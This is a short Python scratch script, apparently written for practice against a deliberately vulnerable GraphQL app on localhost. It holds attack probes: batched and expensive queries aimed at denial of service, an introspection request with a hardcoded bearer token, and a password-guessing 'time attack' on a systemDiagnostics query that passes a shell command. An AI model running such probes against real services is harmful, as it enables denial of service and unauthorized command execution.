import requests

# All pastes
# data = {"operationName":"fetchPaste",
#         "variables":{},
#         "query":"query fetchPaste {\n  pastes {\n    success\n    errors\n    pastes {\n      id\n      title\n      content\n      owner\n      public\n    }\n  }\n}\n"}

# resp = requests.post('http://localhost:5000/graphql', json=data)
# print(resp.json())


### Batch query for pastes
#data = [{"query":"query {\n  pastes\n   {\n    title\n  }\n}","variables":[]}, {"query":"query {\n  pastes\n   {\n    title\n  }\n}","variables":[]}, {"query":"query {\n  pastes\n   {\n    title\n  }\n}","variables":[]}, {"query":"query {\n  pastes\n   {\n    title\n  }\n}","variables":[]}, {"query":"query {\n  pastes\n   {\n    title\n  }\n}","variables":[]}, {"query":"query {\n  pastes\n   {\n    title\n  }\n}","variables":[]}]
#resp = requests.post('http://localhost:5000/graphql', json=data)
#print(resp.json())


### Batch system updates
# data = [{"query":"query {\n  systemUpdate\n}","variables":[]}, {"query":"query {\n  systemUpdate\n}","variables":[]}, {"query":"query {\n  systemUpdate\n}","variables":[]}]
# resp = requests.post('http://localhost:5000/graphql', json=data)
# print(resp.json())


### Expensive query -  system updates
# import time

# start = time.time()
# requests.post('http://localhost:5000/graphql', 
#               json={"query":"query {\n  systemUpdate\n}","variables":[]})
# end = time.time()

# print('Execution Time :: {} seconds'.format(end - start))

### Introspection

# resp = requests.post('http://localhost:5000/graphiql',
#                      json={"query":"query {\n  systemUpdate \n}","variables":None},
#                      headers = {'Authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNjEyMjM3NzA4LCJuYmYiOjE2MTIyMzc3MDgsImp0aSI6IjA5M2Q5NTgzLWYwOTUtNDkyMi05NjE2LWVhMjFhZWZkNjRmNCIsImlkZW50aXR5IjoiZG9sZXYiLCJleHAiOjE2MTIyMzg2MDh9.5B-cEQ8iOYdWJkAwhCmyUDaUgZW56Kp-NlVl0UqwDkQ'})


# print(resp.json())
# {'data': {'__schema': {'queryType': {'name': 'Query'}, 'mutationType': {'name': 'MyMutations'}, 'subscriptionType': None}}}

# time attack
import time

resp = requests.post('http://localhost:5000/graphiql',
                     json={"query":"query {\n  systemDiagnostics(user:\"admin\", password:\"aaaaaaaa\", cmd:\"ls\")\n}","variables":None})


print(resp.json())



